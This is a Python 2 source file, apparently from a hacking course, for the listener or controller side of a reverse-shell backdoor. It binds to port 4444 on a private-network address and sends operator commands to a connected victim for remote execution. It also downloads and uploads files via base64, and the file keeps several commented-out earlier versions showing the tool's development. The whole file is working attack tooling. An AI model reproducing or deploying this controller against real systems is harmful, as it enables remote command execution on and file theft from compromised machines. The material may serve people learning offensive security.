#!/usr/bin/env python
import socket
import json
import base64

# run this code in python2 interpreter or it will not work!!!!
# run this code in python2 interpreter or it will not work!!!!
# run this code in python2 interpreter or it will not work!!!!
# run this code in python2 interpreter or it will not work!!!!
# run this code in python2 interpreter or it will not work!!!!
# run this code in python2 interpreter or it will not work!!!!
# run this code in python2 interpreter or it will not work!!!!
# run this code in python2 interpreter or it will not work!!!!
# run this code in python2 interpreter or it will not work!!!!
# run this code in python2 interpreter or it will not work!!!!


class Listener:
    def __init__(self, ip, port):

        # this code will function the same as nc -l -p 4444
        # using json to perform serialization to help with sending and receiving data over 1024 bytes in size
        # another option for this task is pickle
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        listener.bind((ip, port))
        listener.listen(0)

        print("[+] Waiting for incoming connection")
        self.connection, address = listener.accept()
        print("[+] Got a connection from IP Address: " + str(address[0]) + " and Port Number: " + str(address[1]))

    def reliable_send(self, data):
        json_data = json.dumps(data)
        self.connection.send(json_data)

    def reliable_receive(self):
        json_data = ""
        while True:
            try:
                json_data = json_data + self.connection.recv(1024)
                return json.loads(json_data)
            except ValueError:
                continue

    def execute_remotely(self, command):
        self.reliable_send(command)

        if command[0] == "exit":
            self.connection.close()
            exit()

        return self.reliable_receive()

    def read_file(self, path):
        with open(path, 'rb') as hacker_file:
            return base64.b64encode(hacker_file.read())  # makes images and other files work


    def write_file(self, path, content):
        try:
            with open(path, 'wb') as hacker_file:
                hacker_file.write(base64.b64decode(content))  # this will rewrite the file in its original format
                return "[+] " + path + " Download Successful."
        except TypeError:
            return "[-] Error: File/Directory " + path + " download doesn't exist or is corrupted"

    def run(self):
        while True:
            command = raw_input(">> ")
            command = command.split(" ")

            try:
                if command[0] == "upload" or command[0] == "UPLOAD" or command[0] == "Upload":
                    file_contents = self.read_file(command[1])
                    command.append(file_contents)  # make sure you debug and understand upload functionality.

                result = self.execute_remotely(command)

                if command[0] == "download" or command[0] == "DOWNLOAD" or command[0] == "Download":
                    result = self.write_file(command[1], result)

            # couldn't figure out how to fix the fact that you could upload files that didn't exist
            # had to put a try and except block here to fix it.
            except Exception:
                result = "[-] Error: During command execution"

            print(result)


my_listener = Listener("192.168.220.137", 4444)
my_listener.run()

# added more reliable code, introduced json in a useful way and turned the command into a list separated by a " ".
# class Listener:
#     def __init__(self, ip, port):
#
#         # this code will function the same as nc -l -p 4444
#         # using json to perform serialization to help with sending and receiving data over 1024 bytes in size
#         # another option for this task is pickle
#         listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
#         listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
#         listener.bind((ip, port))
#         listener.listen(0)
#
#         print("[+] Waiting for incoming connection")
#         self.connection, address = listener.accept()
#         print("[+] Got a connection from IP Address: " + str(address[0]) + " and Port Number: " + str(address[1]))
#
#     def reliable_send(self, data):
#         json_data = json.dumps(data)
#         self.connection.send(json_data)
#
#     def reliable_receive(self):
#         json_data = ""
#         while True:
#             try:
#                 json_data = json_data + self.connection.recv(1024)
#                 return json.loads(json_data)
#             except ValueError:
#                 continue
#
#     def execute_remotely(self, command):
#         self.reliable_send(command)
#
#         if command[0] == "exit":
#             self.connection.close()
#             exit()
#
#         return self.reliable_receive()
#
#     def run(self):
#         while True:
#             command = raw_input(">> ")
#             command = command.split(" ")
#             result = self.execute_remotely(command)
#             print(result)
#
#
# my_listener = Listener("192.168.220.133", 4444)
# my_listener.run()

# ----------------------------------------------------------------------------------------------------------------------
#
#
# # code still has a fault, it can't received properly. We need to append the 1024 to the previous 1024 bytes
# class Listener:
#     def __init__(self, ip, port):
#
#         # this code will function the same as nc -l -p 4444
#         # using json to perform serialization to help with sending and receiving data over 1024 bytes in size
#         # another option for this task is pickle
#         listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
#         listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
#         listener.bind((ip, port))
#         listener.listen(0)
#
#         print("[+] Waiting for incoming connection")
#         self.connection, address = listener.accept()
#         print("[+] Got a connection from IP Address: " + str(address[0]) + " and Port Number: " + str(address[1]))
#
#     def reliable_send(self, data):
#         json_data = json.dumps(data)
#         self.connection.send(json_data)
#
#     def reliable_receive(self):
#         json_data = self.connection.recv(1024)
#         return json.loads(json_data)
#
#     def execute_remotely(self, command):
#         self.reliable_send(command)
#         return self.reliable_receive()
#
#     def run(self):
#         while True:
#             command = raw_input(">> ")
#             result = self.execute_remotely(command)
#             print(result)
#
#
# my_listener = Listener("192.168.220.131", 4444)
# my_listener.run()

# ----------------------------------------------------------------------------------------------------------------------
# created a Listener class.
# class Listener:
#     def __init__(self, ip, port):
#         listener = socket.socket()
#         listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
#         listener.bind((ip, port))
#         listener.listen(0)
#
#         print("[+] Waiting for incoming connection")
#         self.connection, address = listener.accept()
#         print("[+] Got a connection from IP Address: " + str(address[0]) + " and Port Number: " + str(address[1]))
#
#     def execute_remotely(self, command):
#         self.connection.send(command)
#         return self.connection.recv(1024)
#
#     def run(self):
#         while True:
#             command = raw_input(">> ")
#             result = self.execute_remotely(command)
#             print(result)
#
#
# my_listener = Listener("192.168.220.133", 4444)
# my_listener.run()
# ----------------------------------------------------------------------------------------------------------------------
# #!/usr/bin/env python
# import socket
#
# # this code will be equilvalent to nc -l -p 4444
# listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
# listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
# listener.bind(("192.168.220.154", 4444))
# listener.listen(0)
# print("[+] Waiting for incoming connection")
# connection, address = listener.accept()
# print("[+] Got a connection from: " + str(address))
#
# while True:
#     command = input(">> ")
#     connection.send(command)
#     result = connection.recv(1024)
#     print(result)
